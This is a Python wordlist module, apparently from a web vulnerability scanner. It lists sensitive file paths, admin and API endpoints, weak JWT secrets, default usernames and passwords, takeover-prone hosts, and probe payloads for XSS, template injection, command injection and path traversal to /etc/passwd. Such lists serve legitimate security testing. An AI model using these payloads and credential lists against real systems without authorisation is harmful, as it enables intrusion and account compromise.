# wordlists.py — قوائم كلمات مدمجة
COMMON_PARAMS = ["id","page","file","url","q","search","name","cat","lang","redirect",
 "next","img","path","dir","view","template","include","read","download","action",
 "cmd","command","callback","data","token","uid","user","email","type","format",
 "mode","ref","return","dest","target","host","image","pic","photo","file2","item",
 "product","post","article","news","slug","filename","folder","page_id"]
COMMON_PATHS = [".env",".env.backup",".env.old",".env.example",".env.save",
 ".git/HEAD",".git/config",".gitignore",".svn/entries","backup.zip","backup.tar.gz",
 "db.sql","database.sql","dump.sql","db_backup.sql","config.php","config.php.bak",
 ".htaccess","server-status","phpmyadmin","pma","adminer.php","_ignition/health-check",
 "_ignition/execute-solution","telescope","horizon","storage/logs/laravel.log",
 "storage/framework/sessions","vendor/autoload.php","vendor/composer/installed.json",
 "composer.json","composer.lock","artisan","phpinfo.php","info.php","test.php","i.php",
 "robots.txt","sitemap.xml","crossdomain.xml","wp-login.php","wp-admin","administrator",
 "admin","login","signin","api","api/","graphql","graphiql","swagger","swagger-ui.html",
 "api-docs","v1","v2","v3","docs","debug","test","tmp","temp","upload","uploads",
 "download","files","assets","static","img","images","css","js","favicon.ico",
 "manifest.json",".well-known/security.txt","console","dashboard","panel","cms",
 "manager","xmlrpc.php","shell.php","cmd.php","upload.php","config","backup","old",
 "web.config","public/.env","app/.env","health","status","healthz","actuator",
 "actuator/health","actuator/env","env","server-info","server-status"]
ADMIN_PATHS = ["admin","administrator","admin/login","admin/index.php","login",
 "signin","auth","auth/login","dashboard","panel","cms","manager","adminpanel",
 "admin/dashboard","user/login","account/login","portal","controlpanel","cp",
 "backend","staff","moderator","superadmin","console","secure","adminarea",
 "wp-admin","wp-login.php","user","users","register","signup"]
API_PATHS = ["api","api/v1","api/v2","api/v3","api/users","api/user","api/login",
 "api/auth","api/token","api/register","api/admin","api/health","api/status",
 "api/config","api/settings","api/version","api/search","api/items","api/products",
 "api/orders","api/files","api/upload","api/webhook","api/export","api/import",
 "api/stats","api/me","api/profile","api/session","api/csrf","api/refresh",
 "api/logout","graphql","graphiql","api/graphql","v1","v2","v3"]
REDIRECT_PARAMS = ["url","redirect","next","return","returnUrl","return_url","dest",
 "destination","target","go","out","rurl","redirect_url","callback","image_url",
 "img_url","link","to","forward","redir","ru","data","page","view","ref","referer",
 "url1","url2","site","path","dir","location","back","returnTo"]
JWT_SECRETS = ["secret","password","123456","qwerty","admin","letmein","jwt_secret",
 "supersecret","changeme","secretkey","key","test","token","your-256-bit-secret",
 "iloveyou","dragon","monkey","master","football","shadow","baseball","access",
 "hello","welcome","admin123","root","toor","passw0rd","P@ssw0rd","secret123",
 "s3cr3t","default","changeit","12345678","123456789","abcdef","abc123","111111",
 "000000","654321","666666","987654321","123123","112233","102030","mysupersecret",
 "laravel","php","framework","jwt-secret","some-secret","sup3rs3cr3t"]
PORTS = [21,22,23,25,53,80,110,143,443,445,853,993,995,1433,1521,2375,3000,3306,
 3389,5432,5900,6379,8000,8080,8443,8888,9000,9090,9200,11211,27017,5000,7000,
 2222,6001,1883,15672,15674]
USERS = ["admin","administrator","root","user","test","guest","webmaster","operator",
 "support","demo","info","backup","admin1","manager","superadmin","editor",
 "moderator","owner","dev","developer","sysadmin","postmaster"]
PASSES = ["admin","password","123456","admin123","password123","root","toor","test",
 "test123","letmein","welcome","12345678","qwerty","P@ssw0rd","passw0rd",
 "changeme","default","1234","12345","0000","admin@123","Admin@123","123",
 "password1","qwerty123","iloveyou","monkey","dragon","shadow","master","baseball"]
TAKEOVER = ["github.io","herokudns.com","herokuapp.com","amazonaws.com",
 "cloudfront.net","azurewebsites.net","trafficmanager.net","cloudapp.net",
 "pantheon.io","fastly.net","surge.sh","bitbucket.io","ghost.io","shopify.com",
 "myshopify.com","wordpress.com","zendesk.com","readme.io","netlify.app",
 "gitlab.io","pages.dev","web.app","firebaseapp.com","s3.amazonaws.com"]
SQLI_ERR_RE = r"(SQL syntax|SQLSTATE|mysql_|mysqli_|PostgreSQL|ORA-\d{5}|SQLite3|sqlite_|syntax error|unclosed quotation|Warning:\s+\w+_query|ODBC SQL Server|Microsoft OLE DB|You have an error in your SQL|PdoException|Illuminate\\Database)"
XSS_PAYLOADS = ['<script>alert(1)</script>', '<svg/onload=alert(1)>', '"><img src=x onerror=alert(1)>']
SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "{{7*'7'}}", "<%= 7*7 %>"]
CMD_PAYLOADS = [(";echo VFZQTEST", "VFZQTEST"), ("|echo VFZQTEST", "VFZQTEST"),
                (";sleep 3", None), ("|sleep 3", None), ("`sleep 3`", None),
                ("$(sleep 3)", None), ("%0Aecho VFZQTEST", "VFZQTEST")]
LFI_PAYLOADS = ["../../../../etc/passwd", "....//....//....//....//etc/passwd",
 "..%2f..%2f..%2f..%2fetc/passwd", "..%252f..%252f..%252f..%252fetc/passwd",
 "php://filter/convert.base64-encode/resource=/etc/passwd", "/etc/passwd",
 "../../../../../../../../etc/passwd", "....//....//....//etc/passwd%00"]
